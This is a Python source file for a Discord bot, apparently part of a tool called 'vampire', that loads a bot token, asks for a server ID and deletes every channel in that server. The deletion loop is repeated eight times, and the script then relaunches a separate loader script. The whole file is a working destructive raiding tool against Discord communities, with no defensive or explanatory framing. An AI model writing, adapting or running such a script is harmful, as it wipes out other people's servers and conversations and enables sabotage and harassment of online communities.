import discord
import time
from discord.ext import commands
from plyer import notification
import os
import colorama
from colorama import Fore, Back, Style

with open('account_data/token.json') as f:
    token = f.read().strip()

os.system("cls")
vampire = commands.Bot(command_prefix=";", intents=discord.Intents.all())

@vampire.event
async def on_ready():

    server_id = input(f'{Fore.GREEN}[+] {Fore.LIGHTRED_EX}Guild id: ')

    
    server = vampire.get_guild(int(server_id))
    if server:
        print(f'{Fore.MAGENTA}[DBG]{Fore.LIGHTRED_EX} Connected Guild: {server.name}')

        
        for channel in server.channels:
            await channel.delete()
            print(f'{Fore.GREEN}[+]{Fore.LIGHTRED_EX} Channel Deleted: {channel.name}')

        for channel in server.channels:
            await channel.delete()
            print(f'{Fore.GREEN}[+]{Fore.LIGHTRED_EX} Channel Deleted: {channel.name}')

        for channel in server.channels:
            await channel.delete()
            print(f'{Fore.GREEN}[+]{Fore.LIGHTRED_EX} Channel Deleted: {channel.name}')
            
        for channel in server.channels:
            await channel.delete()
            print(f'{Fore.GREEN}[+]{Fore.LIGHTRED_EX} Channel Deleted: {channel.name}')

        for channel in server.channels:
            await channel.delete()
            print(f'{Fore.GREEN}[+]{Fore.LIGHTRED_EX} Channel Deleted: {channel.name}')

        for channel in server.channels:
            await channel.delete()
            print(f'{Fore.GREEN}[+]{Fore.LIGHTRED_EX} Channel Deleted: {channel.name}')

        for channel in server.channels:
            await channel.delete()
            print(f'{Fore.GREEN}[+]{Fore.LIGHTRED_EX} Channel Deleted: {channel.name}')
            
        for channel in server.channels:
            await channel.delete()
            print(f'{Fore.GREEN}[+]{Fore.LIGHTRED_EX} Channel Deleted: {channel.name}')
        
        print(f'{Fore.GREEN}[+]{Fore.LIGHTRED_EX} Guild Channel Deleted successfully.')
        os.system("python vampire_Loader.py & cls")
    else:
        print(f'{Fore.BLACK}[-]{Fore.LIGHTRED_EX} Failed to find the server.')
        os.system("python vampire_Loader.py & cls")

vampire.run(token)
